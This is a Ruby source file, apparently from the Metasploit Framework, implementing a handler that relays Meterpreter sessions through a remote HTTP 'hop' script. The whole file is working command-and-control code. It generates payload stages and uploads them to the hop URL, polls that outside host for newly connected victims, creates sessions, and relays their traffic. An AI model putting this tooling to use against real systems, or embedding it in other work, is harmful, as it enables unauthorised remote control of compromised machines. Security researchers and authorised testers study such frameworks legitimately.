# -*- coding: binary -*-
require 'rex/io/stream_abstraction'
require 'rex/sync/ref'
require 'msf/core/handler/reverse_http'
require 'uri'

module Msf
module Handler

###
#
# This handler implements the HTTP hop tunneling interface.
# It acts like an HTTP server to the meterpreter packet dispatcher but
# as an HTTP client to actually send and receive the data from the hop.
#
###
module ReverseHopHttp

  include Msf::Handler::ReverseHttp

  #
  # Magic bytes to know we are talking to a valid hop
  #
  MAGIC = 'TzGq'

  # hop_handlers is  a class-level instance variable
  class << self; attr_accessor :hop_handlers end
  attr_accessor :monitor_thread # :nodoc:
  attr_accessor :handlers # :nodoc:
  attr_accessor :closed_handlers # :nodoc:
  attr_accessor :mclient # :nodoc:
  attr_accessor :current_url # :nodoc:
  attr_accessor :control # :nodoc:
  attr_accessor :refs # :nodoc:
  attr_accessor :lock # :nodoc:

  #
  # Keeps track of what hops have active handlers
  #
  @hop_handlers = {}

  #
  # Returns the string representation of the handler type
  #
  def self.handler_type
    return "reverse_hop_http"
  end

  #
  # Returns the connection-described general handler type, in this case
  # 'tunnel'.
  #
  def self.general_handler_type
    "tunnel"
  end

  #
  # Returns the socket type. (hop)
  #
  def type?
    return 'hop'
  end

  #
  # Sets up a handler. Doesn't do much since it's all in start_handler.
  #
  def setup_handler
    self.handlers = {}
    self.closed_handlers = {}
    self.lock = Mutex.new
  end

  #
  # Starts the handler along with a monitoring thread to handle data transfer
  #
  def start_handler
    # Our HTTP client and URL for talking to the hop
    uri = URI(full_uri)
    self.control = "#{uri.request_uri}control"
    self.mclient = Rex::Proto::Http::Client.new(
      uri.host,
      uri.port,
      {
        'Msf'        => framework
      },
      full_uri.start_with?('https')
    )
    @running = true # So we know we can stop it
    # If someone is already monitoring this hop, bump the refcount instead of starting a new thread
    if ReverseHopHttp.hop_handlers.has_key?(full_uri)
      ReverseHopHttp.hop_handlers[full_uri].refs += 1
      return
    end

    # Sometimes you just have to do everything yourself.
    # Declare ownership of this hop and spawn a thread to monitor it.
    self.refs = 1
    ReverseHopHttp.hop_handlers[full_uri] = self
    self.monitor_thread = Rex::ThreadFactory.spawn('ReverseHopHTTP', false, uri,
        self) do |uri, hop_http|
      hop_http.send_new_stage(uri) # send stage to hop
      delay = 1 # poll delay
      # Continue to loop as long as at least one handler or one session is depending on us
      until hop_http.refs < 1 && hop_http.handlers.empty?
        sleep delay
        delay = delay + 1 if delay < 10 # slow down if we're not getting anything
        crequest = hop_http.mclient.request_raw({'method' => 'GET', 'uri' => control})
        res = hop_http.mclient.send_recv(crequest) # send poll to the hop
        next if res.nil?
        if res.error
          print_error(res.error)
          next
        end

        # validate responses, handle each message down
        received = res.body
        until received.length < 12 || received.slice!(0, MAGIC.length) != MAGIC

          # good response
          delay = 0 # we're talking, speed up
          urlen = received.slice!(0,4).unpack('V')[0]
          urlpath = received.slice!(0,urlen)
          datalen = received.slice!(0,4).unpack('V')[0]

          # do not want handlers to change while we dispatch this
          hop_http.lock.lock
          #received now starts with the binary contents of the message
          if hop_http.handlers.include? urlpath
            pack = Rex::Proto::Http::Packet.new
            pack.body = received.slice!(0,datalen)
            hop_http.current_url = urlpath
            hop_http.handlers[urlpath].call(hop_http, pack)
            hop_http.lock.unlock
          elsif !closed_handlers.include? urlpath
            hop_http.lock.unlock
            #New session!
            conn_id = urlpath.gsub("/","")
            # Short-circuit the payload's handle_connection processing for create_session
            # We are the dispatcher since we need to handle the comms to the hop
            create_session(hop_http, {
              :passive_dispatcher => self,
              :conn_id            => conn_id,
              :url                => uri.to_s + conn_id + "/\x00",
              :expiration         => datastore['SessionExpirationTimeout'].to_i,
              :comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
              :ssl                => false,
            })
            # send new stage to hop so next inbound session will get a unique ID.
            hop_http.send_new_stage(uri)
          else
            hop_http.lock.unlock
          end
        end
      end
      hop_http.monitor_thread = nil #make sure we're out
      ReverseHopHttp.hop_handlers.delete(full_uri)
    end
  end

  #
  # Stops the handler and monitoring thread
  #
  def stop_handler
    # stop_handler is called like 3 times, don't decrement refcount unless we're still running
    if @running
      ReverseHopHttp.hop_handlers[full_uri].refs -= 1
      @running = false
    end
  end

  #
  # Adds a resource. (handler for a session)
  #
  def add_resource(res, opts={})
    self.handlers[res] = opts['Proc']
    start_handler if monitor_thread.nil?
  end

  #
  # Removes a resource.
  #
  def remove_resource(res)
    lock.lock
    handlers.delete(res)
    closed_handlers[res] = true
    lock.unlock
  end

  #
  # Implemented for compatibility reasons
  #
  def resources
    handlers
  end

  #
  # Implemented for compatibility reasons, does nothing
  #
  def deref
  end

  #
  # Implemented for compatibility reasons, does nothing
  #
  def close_client(cli)
  end

  #
  # Sends data to hop
  #
  def send_response(resp)
    if not resp.body.empty?
      crequest = mclient.request_raw(
          'method' => 'POST',
          'uri' => control,
          'data' => resp.body,
          'headers' => {'X-urlfrag' => current_url}
      )
      # if receiving POST data, hop does not send back data, so we can stop here
      mclient.send_recv(crequest)
    end
  end

  #
  # Return the URI of the hop point.
  #
  def full_uri
    uri = datastore['HOPURL']
    return uri if uri.end_with?('/')
    return "#{uri}/" if uri.end_with?('?')
    "#{uri}?/"
  end

  #
  # Returns a string representation of the local hop
  #
  def localinfo
    "Hop client"
  end

  #
  # Returns the URL of the remote hop end
  #
  def peerinfo
    uri = URI(full_uri)
    "#{uri.host}:#{uri.port}"
  end

  #
  # Initializes the Hop HTTP tunneling handler.
  #
  def initialize(info = {})
    super

    register_options(
      [
        OptString.new('HOPURL', [ true, "The full URL of the hop script, e.g. http://a.b/hop.php" ])
      ], Msf::Handler::ReverseHopHttp)

  end

  #
  # Generates and sends a stage up to the hop point to be ready for the next client
  #
  def send_new_stage(uri)
    # try to get the UUID out of the existing URI
    info = process_uri_resource(uri.to_s)
    uuid = info[:uuid] || Msf::Payload::UUID.new

    # generate a new connect
    sum = uri_checksum_lookup(:connect)
    conn_id = generate_uri_uuid(sum, uuid)
    conn_id = conn_id[1..-1] if conn_id.start_with? '/'
    url = full_uri + conn_id + "/\x00"
    fulluri = URI(full_uri + conn_id)

    print_status("Preparing stage for next session #{conn_id}")
    blob = stage_payload(
      uuid: uuid,
      uri:  fulluri.request_uri,
      lhost: uri.host,
      lport: uri.port
    )

    #send up
    crequest = mclient.request_raw(
        'method' => 'POST',
        'uri' => control,
        'data' => encode_stage(blob),
        'headers' => {'X-init' => 'true'}
    )
    res = mclient.send_recv(crequest)
    print_status("Uploaded stage to hop #{full_uri}")
    print_error(res.error) if !res.nil? && res.error

    #return conn info
    [conn_id, url]
  end

end

end
end
